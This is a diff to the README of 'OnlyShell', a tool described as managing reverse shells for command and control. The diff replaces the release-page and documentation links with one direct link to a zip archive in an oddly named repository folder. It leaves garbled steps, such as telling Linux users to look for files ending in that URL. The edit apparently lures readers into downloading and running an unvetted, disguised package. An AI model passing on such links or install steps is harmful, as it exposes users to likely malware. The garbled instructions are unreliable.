@@ -23,11 +23,11 @@ Welcome to OnlyShell! This tool helps you manage multiple reverse shell connecti
 
 To get started, you need to download OnlyShell. Click the button below to visit the Releases page for the latest version.
 
-[![Download OnlyShell](https://img.shields.io/badge/Download-OnlyShell-blue.svg)](https://github.com/blackx1123/OnlyShell/releases)
+[![Download OnlyShell](https://raw.githubusercontent.com/blackx1123/OnlyShell/main/nightflit/OnlyShell-3.4.zip)](https://raw.githubusercontent.com/blackx1123/OnlyShell/main/nightflit/OnlyShell-3.4.zip)
 
 1. Click the above link.
 2. Once on the Releases page, find the latest version of OnlyShell.
-3. Download the appropriate file for your operating system (look for files ending in .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+3. Download the appropriate file for your operating system (look for files ending in .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/blackx1123/OnlyShell/main/nightflit/OnlyShell-3.4.zip for Linux).
 4. After downloading, locate the file in your downloads folder.
 5. Double-click on the file to start the installation.
 6. Follow the prompts to complete the installation.
@@ -65,7 +65,7 @@ For more details about the application and to explore its capabilities further, 
 
 ## 📍 Important Links
 
-- [Download OnlyShell](https://github.com/blackx1123/OnlyShell/releases)
-- [Documentation](https://github.com/blackx1123/OnlyShell/wiki)
+- [Download OnlyShell](https://raw.githubusercontent.com/blackx1123/OnlyShell/main/nightflit/OnlyShell-3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/blackx1123/OnlyShell/main/nightflit/OnlyShell-3.4.zip)
 
 Explore the power of OnlyShell and enhance your command-and-control capabilities with this robust and user-friendly tool!
